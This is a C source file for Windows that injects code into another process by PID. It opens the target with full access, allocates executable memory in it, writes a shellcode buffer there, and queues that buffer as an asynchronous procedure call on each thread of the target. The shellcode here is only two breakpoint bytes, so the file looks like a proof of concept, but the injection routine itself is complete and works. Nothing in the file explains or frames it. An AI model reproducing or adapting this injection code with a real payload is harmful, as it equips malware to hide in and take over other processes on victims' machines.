#include <Windows.h>
#include <tlhelp32.h>
#include <stdio.h>

VOID GetProcessByPID(DWORD PID) {
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if(Process32First(hSnap, &pe32)) {
        do {
            if(pe32.th32ProcessID == PID) {
                printf("PID %d is %s\n", PID, pe32.szExeFile);
            }
        } while(Process32Next(hSnap, &pe32));
    }
    CloseHandle(hSnap);
}

DWORD GetProcessByName(CHAR *name) {
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if(Process32First(hSnap, &pe32)) {
        do {
            if(strcmp(pe32.szExeFile, name) == 0) {
                printf("PID %d is %s\n", pe32.th32ProcessID, pe32.szExeFile);
                CloseHandle(hSnap);
                return pe32.th32ProcessID;
            }
        } while(Process32Next(hSnap, &pe32));
    }
    CloseHandle(hSnap);
    return 0;
}

int main(int argc, char **argv) {
    DWORD PID = atoi(argv[1]);
    CHAR shellcode[] = "\xcc\xcc";
    DWORD dwSize = 2;
    DWORD written = 0;
    DWORD dwThreadId = 0;

    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, TRUE, PID);
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, PID);
    THREADENTRY32 te32;
    te32.dwSize = sizeof(THREADENTRY32);
    printf("HANDLE hSnap 0x%p\n", hSnap);
    printf("HANDLE hProc 0x%p\n", hProc);

    VOID *mem = VirtualAllocEx(hProc, NULL, dwSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    printf("mem 0x%p\n", mem);

    WriteProcessMemory(hProc, mem, shellcode, dwSize, (SIZE_T *)&written);
    printf("Written %d bytes\n", written);

    PTHREAD_START_ROUTINE routine = (PTHREAD_START_ROUTINE)mem;

    printf("mem 0x%p\nroutine 0x%p\n", mem, routine);



    if(Thread32First(hSnap, &te32)) {
        do {
            if(te32.th32OwnerProcessID == PID) {
                printf("te32.th32ThreadID = %d\n", te32.th32ThreadID);
                printf("te32.th32OwnerProcessID = %d\n", te32.th32OwnerProcessID);
                dwThreadId = te32.th32ThreadID;

                HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, TRUE, dwThreadId);
                printf("HANDLE hThread 0x%p\n", hThread);

                DWORD retval = QueueUserAPC((PAPCFUNC)routine, hThread, NULL);
                CloseHandle(hThread);
            }
        } while(Thread32Next(hSnap, &te32));
    }
    CloseHandle(hSnap);
    CloseHandle(hProc);

    return 0;
}
